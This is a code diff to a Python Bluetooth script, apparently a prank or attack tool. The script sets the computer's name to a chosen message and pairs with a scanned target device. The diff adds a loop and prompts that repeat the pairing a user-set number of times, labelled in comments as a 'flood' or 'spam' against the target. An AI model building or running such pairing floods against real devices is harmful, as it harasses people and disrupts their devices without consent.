@@ -14,6 +14,9 @@ import time
 temp_dir = tempfile.mkdtemp()
 
 counter = 0
+
+send_counter = 0 #counter for numbers of times you want to pair with the targer (for flood)
+
 scan_duration = 5
 
 ble_list_name = []
@@ -55,8 +58,12 @@ f"""
         sys.exit()
     else:
         global new_name
+        global spam_counter
         message_input = f"{BOLD}{BLUE}[?] Choose your message : {RESET}"
+        spam_counter_msg = f"{BOLD}{BLUE}[?] How often do I pair to the target ? [FOR SPAM OR NOT] : {RESET}"
+
         new_name = input(message_input)
+        spam_counter = int(input(spam_counter_msg))
 
         #start bluetooth service
         os.system("systemctl start bluetooth")
@@ -173,7 +180,9 @@ change_computer_name(new_name)
 # Bluetooth pairing
 print(BOLD, BLUE,f"[+] Connect to {device_name} MAC : {device_address}",RESET)
 
-pair_bluetooth(device_address)
+while send_counter < spam_counter:
+    send_counter += 1
+    pair_bluetooth(device_address)
 
 #start bluetooth service
 os.system("bluetoothctl scan off && systemctl stop bluetooth")
